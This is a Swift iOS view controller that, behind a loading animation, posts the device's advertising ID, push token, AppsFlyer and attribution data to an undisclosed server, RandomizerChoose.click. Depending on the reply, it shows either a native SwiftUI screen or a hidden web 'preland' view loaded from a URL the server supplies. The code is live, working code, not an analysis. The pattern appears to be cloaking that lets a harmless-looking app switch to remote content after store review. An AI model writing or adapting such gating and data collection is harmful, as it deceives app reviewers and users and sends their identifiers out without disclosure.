


import UIKit
import SwiftUI
import Lottie

class ViewController: UIViewController, URLSessionDelegate {
    
    @IBOutlet weak var BgFill: UIImageView!
    @IBOutlet weak var BgImage: UIImageView!
    
    var window: UIWindow?
    let appDelegate = UIApplication.shared.delegate as? AppDelegate
    let bundleIdentifier = Bundle.main.bundleIdentifier
    var pathIdentifier = ""
    var idUserNumber = ""
    
    var progressValue : Float = 0
    var animationView = Lottie.LottieAnimationView()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        self.window = UIWindow(frame: UIScreen.main.bounds)
        
        animationView.animation = .named("loading")
        animationView.contentMode = .scaleAspectFit
        animationView.frame = CGRect(x: view.bounds.width / 2 - 150 , y: view.bounds.height / 2 - 150, width: 300, height: 300 )
        animationView.loopMode = .loop
        animationView.contentMode = .scaleAspectFit
        animationView.animationSpeed = 1
        view.addSubview(animationView)
        animationView.play()
    }
    
    func startLoading() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.5) {
            if self.pathIdentifier == ""{
                self.sendToRequest()
            }
        }
    }
    
    func MainView() {
        
        let homeViewController = UIHostingController(rootView: Crazy.MainView())
        addChild(homeViewController)
        view.addSubview(homeViewController.view)
        AppUtility.lockOrientation(.portrait)
        BgImage.alpha = 1
        BgFill.alpha = 0
        animationView.stop()
        
        homeViewController.view.translatesAutoresizingMaskIntoConstraints = false
        homeViewController.view.topAnchor.constraint(equalTo: view.topAnchor).isActive = true
        homeViewController.view.bottomAnchor.constraint(equalTo: view.bottomAnchor).isActive = true
        homeViewController.view.leftAnchor.constraint(equalTo: view.leftAnchor).isActive = true
        homeViewController.view.rightAnchor.constraint(equalTo: view.rightAnchor).isActive = true
    }

    func Apps() {
        let preland = Helper()
        preland.sourceData = self.pathIdentifier

        addChild(preland)
        preland.view.alpha = 0
        self.view.addSubview(preland.view)

        preland.view.translatesAutoresizingMaskIntoConstraints = false
        preland.view.topAnchor.constraint(equalTo: view.topAnchor).isActive = true
        preland.view.bottomAnchor.constraint(equalTo: view.bottomAnchor).isActive = true
        preland.view.leftAnchor.constraint(equalTo: view.leftAnchor).isActive = true
        preland.view.rightAnchor.constraint(equalTo: view.rightAnchor).isActive = true

        DispatchQueue.main.asyncAfter(deadline: .now() + 3.5) {
            AppUtility.lockOrientation(.all)
            self.animationView.isHidden = true
            self.BgImage.alpha = 0
            self.BgFill.alpha = 1
            preland.view.alpha = 1
            self.animationView.stop()
        }
    }
    
    func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest request: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
        completionHandler(nil)
    }
    override var shouldAutorotate: Bool {
        return true
    }
    override var supportedInterfaceOrientations: UIInterfaceOrientationMask {
        if UIDevice.current.userInterfaceIdiom == .phone {
            return .allButUpsideDown
        } else {
            return .all
        }
    }
    func sendToRequest() {
        let url = URL(string: "https://RandomizerChoose.click/starting")
        let dictionariData: [String: Any?] = ["facebook-deeplink" : appDelegate?.deepLinkParameterFB, "push-token" : appDelegate?.tokenPushNotification, "appsflyer" : appDelegate?.oldAndNotWorkingNames, "deep_link_sub2" : appDelegate?.subject2, "deepLinkStr": appDelegate?.oneLinkDeepLink, "timezone-geo": appDelegate?.geographicalNameTimeZone, "timezome-gmt" : appDelegate?.abbreviationTimeZone, "apps-flyer-id": appDelegate!.uniqueIdentifierAppsFlyer, "attribution-data" : appDelegate?.dataAttribution, "deep_link_sub1" : appDelegate?.subject1, "deep_link_sub3" : appDelegate?.subject3, "deep_link_sub4" : appDelegate?.subject4, "deep_link_sub5" : appDelegate?.subject5]
    
        print(dictionariData)
        var request = URLRequest(url: url!)
        let json = try? JSONSerialization.data(withJSONObject: dictionariData)
        request.httpBody = json
        request.httpMethod = "POST"
        request.addValue(appDelegate!.identifierAdvertising, forHTTPHeaderField: "GID")
        request.addValue(bundleIdentifier!, forHTTPHeaderField: "PackageName")
        request.addValue(appDelegate!.uniqueIdentifierAppsFlyer, forHTTPHeaderField: "ID")
        let configuration = URLSessionConfiguration.ephemeral
        configuration.waitsForConnectivity = false
        configuration.timeoutIntervalForResource = 60
        configuration.timeoutIntervalForRequest = 60
        let session = URLSession(configuration: configuration, delegate: self, delegateQueue: OperationQueue.main)
        let task = session.dataTask(with: request) { (data, response, error) in
            guard let data = data, error == nil else {
                DispatchQueue.main.async {
                    self.MainView()
                }
                return
            }
            let responseJSON = try? JSONSerialization.jsonObject(with: data, options: [])
            if let responseJSON = responseJSON as? [String: Any] {
                guard let result = responseJSON["result"] as? String else { return }
                self.pathIdentifier = result
//                self.pathIdentifier = "https://uk.wikipedia.org/wiki/%D0%9B%D0%B5%D0%BD%D1%96%D0%BD_%E2%80%94_%D0%B3%D1%80%D0%B8%D0%B1?&mob_id=251258"
                let user = responseJSON["userID"] as? Int
                guard let strUser = user else { return }
                self.idUserNumber = "\(strUser)"
                print(responseJSON)
            }
            if let response = response as? HTTPURLResponse {
                if response.statusCode == 200 {
                    self.MainView()
//                    self.Apps()
                } else if response.statusCode == 302 {
                    if self.pathIdentifier != "" {
                        self.Apps()
                    }
                } else {

                }
            }
            return
        }
        task.resume()
    }
    override var prefersStatusBarHidden: Bool {
        return true
    }
}

extension UIWindow {

    func switchRootViewController(_ viewController: UIViewController,
                                  animated: Bool = true,
                                  duration: TimeInterval = 0.5,
                                  options: AnimationOptions = .transitionFlipFromRight,
                                  completion: (() -> Void)? = nil) {
        guard animated else {
            rootViewController = viewController
            return
        }

        UIView.transition(with: self, duration: duration, options: options, animations: {
            let oldState = UIView.areAnimationsEnabled
            UIView.setAnimationsEnabled(false)
            self.rootViewController = viewController
            UIView.setAnimationsEnabled(oldState)
        }, completion: { _ in
            completion?()
        })
    }

}
struct AppUtility {
    static func lockOrientation(_ orientation: UIInterfaceOrientationMask) {

        if let delegate = UIApplication.shared.delegate as? AppDelegate {
            delegate.orientationLock = orientation
        }
    }
    static func lockOrientation(_ orientation: UIInterfaceOrientationMask, andRotateTo rotateOrientation:UIInterfaceOrientation) {

        self.lockOrientation(orientation)

        UIDevice.current.setValue(rotateOrientation.rawValue, forKey: "orientation")
        UINavigationController.attemptRotationToDeviceOrientation()
    }
}

